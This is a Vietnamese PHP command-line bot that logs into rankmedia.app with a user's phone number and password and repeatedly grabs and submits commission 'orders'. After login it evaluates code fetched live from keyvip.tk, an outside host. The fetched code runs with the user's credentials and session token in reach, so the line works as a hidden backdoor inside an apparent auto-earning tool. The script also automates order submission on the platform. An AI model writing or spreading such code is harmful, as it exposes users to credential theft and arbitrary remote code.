error_reporting(0);
session_start();
$res="\033[0m";
$BBlack="\033[1;30m" ; 
$BRed="\033[1;31m" ;
$BGreen="\033[1;32m" ;
$BYellow="\033[1;33m" ;
$BBlue="\033[1;34m" ;
$BPurple="\033[1;35m" ;
$BCyan="\033[1;36m" ;
$BWhite="\033[1;37m" ;
$Blue="\033[0;34m";
$lime="\033[1;32m";
$red="\033[1;31m";
$xanh="\033[1;32m";
$cyan="\033[1;36m";
$yellow="\033[1;33m";
$turquoise="\033[1;34m";
$maugi="\033[1;35m";
$white= "\033[1;37m";
$red="\033[1;31m";
$white= "\033[1;37m";
$whiteb= "\033[1;37m";
$redb="\033[1;31m";
$green="\033[1;32m";
$yellow="\033[1;33m";
$cam="\033[1;33m";
$test="\033[1;33m";
$greenb="\033[1;32m";
$blue="\033[1;34m";
$lam="\033[1;34m";
$tmi="\033[1;34m";
$hong="\033[1;35m";
$imt="\033[1;35m";
$cyan= "\e[1;36m";
$syan="\033[1;36m";
$xnhac= "\033[1;96m";
$den="\033[1;90m";
$do="\033[1;91m";
$luc="\033[1;92m";
$vang="\033[1;93m";
$xduong="\033[1;94m";
$hong="\033[1;95m";
$trang="\033[1;97m";
$vang="\033[1;93m";
$do="\033[1;91m";
$BBlack="\033[1;30m";      
$BRed="\033[1;31m";
$BGreen="\033[1;32m";
$BYellow="\033[1;33m";
$BBlue="\033[1;34m";
$BPurple="\033[1;35m";
$BCyan="\033[1;36m";
$BWhite="\033[1;37m";
$Blue="\033[0;34m";
$lime="\033[1;32m";
$red="\033[1;31m";
$xanh="\033[1;32m";
$cyan="\033[1;36m";
$yellow="\033[1;33m";
$turquoise="\033[1;34m";
$maugi="\033[1;35m";
$white= "\033[1;37m";
$BCyan="\033[1;36m";
$trang="\033[1;37m";
$do="\033[1;31m";
$luc="\033[1;32m";
$vang="\033[1;33m";
$luc="\033[1;92m";
$gio = date('h:i');
@system("clear");
echo "         \033[1;47;34mĐăng Nhập RankMedia.App\033[0m\n\n";
echo $res."~".$red."[".$green."✔".$red."]".$res." =>\033[1;37m Số Điện Thoại: \033[1;35m";
$sdt=trim(fgets(STDIN));
echo $res."~".$red."[".$green."✔".$red."]".$res." =>\033[1;37m Mật Khẩu: \033[1;30m";
$pwd=trim(fgets(STDIN));
$user="https://keyvip.tk/user.php";
$mr = curl_init();
curl_setopt_array($mr, array(
CURLOPT_URL => "https://rankmedia.app/api/login/signIn",
CURLOPT_RETURNTRANSFER => true,
CURLOPT_COOKIEJAR => "cookie.txt",
CURLOPT_COOKIEFILE => "cookie.txt",
CURLOPT_POSTFIELDS => "username=$sdt&passwd=$pwd&code=84",
CURLOPT_HTTPHEADER => array(
"xHost:rankmedia.app",
"lang:vi",
"user-agent:Mozilla/5.0 (Linux; Android 9; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/93.0.188 Mobile Chrome/87.0.4280.188 Mobile Safari/537.36",
"content-type:application/x-www-form-urlencoded",
)));
$result = curl_exec($mr); curl_close($mr);
$json = json_decode($result);
$login = $json->info;
$token = $json->data->token;
$staffid = $json->data->staffid;
if ($login == "đăng nhập thành công"){
echo "\033[1;37m~\033[1;31m[\033[1;32m✔\033[1;31m]\033[1;37m =>\033[1;32m Đăng Nhập Thành Công\n";
sleep(1);
}else{
exit("\033[1;37m~\033[1;31m[\033[1;32m✖\033[1;31m]\033[1;37m =>\033[1;31m Đăng Nhập Thất Bại, Hãy Xem Lại\n");
}
@system("clear");
eval(file_get_contents("https://keyvip.tk/logo.php"));
$head = array(
"Host:rankmedia.app",
"lang:vi",
"staffid:$staffid",
"user-agent:$user",
"token:$token",
);

$mr = curl_init();
curl_setopt_array($mr, array(
CURLOPT_URL => "https://rankmedia.app/api/index/index",
CURLOPT_RETURNTRANSFER => true,
CURLOPT_HTTPHEADER => $head));
$result = curl_exec($mr); curl_close($mr);
$json = json_decode($result);
$balance = $json->data->userinfo->balance;
echo "\033[1;33m──────────────────────────────────\n";
echo "\033[1;37m~\033[1;31m[\033[1;32m✔\033[1;31m] \033[1;32mSố Điện Thoại:\033[1;37m ".$sdt."\n";
echo "\033[1;37m~\033[1;31m[\033[1;32m✔\033[1;31m] \033[1;32mSố Tiền Hiện Có:\033[1;35m ".$balance." \033[1;33mvnđ\n";
echo "\033[1;33m──────────────────────────────────\n";
sleep(2);
while(true){
$mr = curl_init();
curl_setopt_array($mr, array(
CURLOPT_URL => "https://rankmedia.app/api/index/index",
CURLOPT_RETURNTRANSFER => true,
CURLOPT_HTTPHEADER => $head));
$result = curl_exec($mr); curl_close($mr);
$json = json_decode($result);
$balance = $json->data->userinfo->balance;

$mr = curl_init();
curl_setopt_array($mr, array(
CURLOPT_URL => "https://rankmedia.app/api/index/goods_list",
CURLOPT_RETURNTRANSFER => true,
CURLOPT_HTTPHEADER => $head));
$result = curl_exec($mr); curl_close($mr);
$json = json_decode($result,true);
$id = $json['data']['0']['id'];
$thuong = $json['data']['0']['commission'];
echo "\033[1;31m[\033[1;30m".$gio."\033[1;31m] \033[1;32mID Đơn Hàng : \033[1;35m".$id."\n\033[1;31m[\033[1;30m".$gio."\033[1;31m]\033[1;32m Hoàn Thành  :\033[1;36m +".$thuong."đ\n\033[1;31m[\033[1;30m".$gio."\033[1;31m]\033[1;32m Tổng Tiền   :\033[1;33m ".$balance."đ\n";
echo "\r\033[1;31m[\033[1;30m".$gio."\033[1;31m] \033[1;32mTrạng Thái  :\033[1;34m Đang Làm\r";
$mr = curl_init();
curl_setopt_array($mr, array(
CURLOPT_URL => "https://rankmedia.app/api/Shuadan/getorder?goods_id=$id",
CURLOPT_RETURNTRANSFER => true,
CURLOPT_HTTPHEADER => $head));
$result = curl_exec($mr); curl_close($mr);
$json = json_decode($result,true);

$mr = curl_init();
curl_setopt_array($mr, array(
CURLOPT_URL => "https://rankmedia.app/api/Shuadan/check?goods_id=$id",
CURLOPT_RETURNTRANSFER => true,
CURLOPT_HTTPHEADER => $head));
$result = curl_exec($mr); curl_close($mr);
$json = json_decode($result);
$oid = $json->data->oid;
$info = $json->info;
if ($info == "Các nhiệm vụ đơn đặt hàng hôm nay đã đạt đến giới hạn trên, vui lòng tạm nghỉ và tiếp tục vào ngày mai!"){
exit("\033[1;37m~\033[1;31m[\033[1;32m✔\033[1;31m]\033[1;37m Hết Lượt Gửi Đơn, Quay Lại Vào Ngày Mai\n");
}
if ($info == "sự thành công"){
$mr = curl_init();
curl_setopt_array($mr, array(
CURLOPT_URL => "https://rankmedia.app/api/Shuadan/submit_order?goods_id=$oid",
CURLOPT_RETURNTRANSFER => true,
CURLOPT_HTTPHEADER => $head));
$result = curl_exec($mr); curl_close($mr);
$json = json_decode($result);
$nhan = $json->info;
sleep(1);
if ($nhan == 'Sau khi giao dịch hoàn tất, tiền gốc và hoa hồng giao dịch sẽ được chuyển vào tài khoản của bạn. Bạn có thể xem chi tiết thông qua "Lịch sử đơn hàng" hoặc "Chi tiết thanh toán" tại trung tâm cá nhân của mình.'){
echo "\r\033[1;31m[\033[1;30m".$gio."\033[1;31m] \033[1;32mTrạng Thái  :\033[1;32m Thành Công\n";
}else{
echo "\r\033[1;31m[\033[1;30m".$gio."\033[1;31m] \033[1;31mTrạng Thái  :\033[1;31mThất Bại \n";
}
}else{exit("\033[1;31mLỗi!!! Hết Đơn Hàng Hoặc Gửi Đơn Thất Bại, Hãy Xem Lại\n");}
for($v=0;$v<= 8;$v++){
echo "\033[1;31m- ";usleep(2000);
echo "\033[1;33m- ";usleep(15000);}
echo "\n"; 
for ($i=30;$i>-1;$i--){
echo "\r 🌸 ~>      $xduong đợi$vang |$yellow ".$i."$vang | \r";
usleep(133333);
echo "\r 🌸   ~>    $xnhac đợi$hong |$yellow ".$i."$hong | \r";
usleep(133333);
echo "\r 🌸    ~>   $luc đợi$do |$yellow ".$i."$do | ";
usleep(133333);
echo "\r 🌸     ~>  $trang đợi$den |$yellow ".$i."$den | \r";
usleep(133333);
echo "\r 🌸       ~> $xduong đợi$xduong |$yellow ".$i."$xduong | \r";
usleep(133333);
echo "\r 🌸        ~>$vang đợi$do |$yellow ".$i."$do | \r";
}
}
